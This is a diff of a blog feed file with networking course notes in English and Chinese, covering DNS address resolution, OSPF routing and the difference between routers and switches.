@@ -5023,7 +5023,7 @@
 </li>
 </ul>
 <h3 id="ACTIVITY-A-Address-Resolution"><a href="#ACTIVITY-A-Address-Resolution" class="headerlink" title="ACTIVITY A: Address Resolution"></a>ACTIVITY A: Address Resolution</h3><ol>
-<li>Explain how application layer addresses (e.g. <a href="http://www.monash.edu/">www.monash.edu</a> or <a href="mailto:&#106;&#x73;&#109;&#105;&#x74;&#x68;&#x40;&#x66;&#x6f;&#111;&#46;&#x63;&#111;&#109;">&#106;&#x73;&#109;&#105;&#x74;&#x68;&#x40;&#x66;&#x6f;&#111;&#46;&#x63;&#111;&#109;</a>) are resolved to IP addresses and why is this necessary.</li>
+<li>Explain how application layer addresses (e.g. <a href="http://www.monash.edu/">www.monash.edu</a> or <a href="mailto:&#106;&#x73;&#x6d;&#x69;&#x74;&#x68;&#64;&#x66;&#111;&#111;&#46;&#x63;&#x6f;&#109;">&#106;&#x73;&#x6d;&#x69;&#x74;&#x68;&#64;&#x66;&#111;&#111;&#46;&#x63;&#x6f;&#109;</a>) are resolved to IP addresses and why is this necessary.</li>
 </ol>
 <p>URL -&gt; DNS analysis route get the IP request </p>
 <ol start="2">
@@ -5060,6 +5060,9 @@
 <td>链路状态路由协议的一个示例是开放最短路径优先 (OSPF) 协议，它通常用于大型企业网络。 OSPF 依赖于每个节点将有关其本地连接的信息广播到网络中的所有其他节点，这些信息用于构建网络拓扑的完整地图。 然后使用此信息使用 Dijkstra 算法计算到目的地的最短路径。</td>
 </tr>
 </tbody></table>
+<h3 id="Router-amp-switch"><a href="#Router-amp-switch" class="headerlink" title="Router &amp; switch"></a>Router &amp; switch</h3><p><strong>Router 路由器</strong>： 位于网络层，根据目标地址将数据包从一个网络传输到另一个网络，并负责在不同的网络之间转发数据。路由器通常使用路由协议来建立和维护路由表，以便选择最佳路径将数据包传输到目标网络。</p>
+<p><strong>Switch 交换机</strong>： 数据链路层，在局域网内转发数据包，通过学习 <code>MAC地址</code> 并将数据包转发到适当的端口来实现局域网内的通信。交换机通常使用 <code>MAC地址表</code> 来决定将数据包转发到哪个端口。</p>
+<p><em>(技术迭代更新)，现在大部分路由器和交换机具有多层功能，可以在多个层次上工作。</em><br>路由器和交换机可以支持在第四层（传输层）和第七层（应用层）上执行负载平衡和流量控制。</p>
 ]]></content>
       <categories>
         <category>Monash笔记</category>
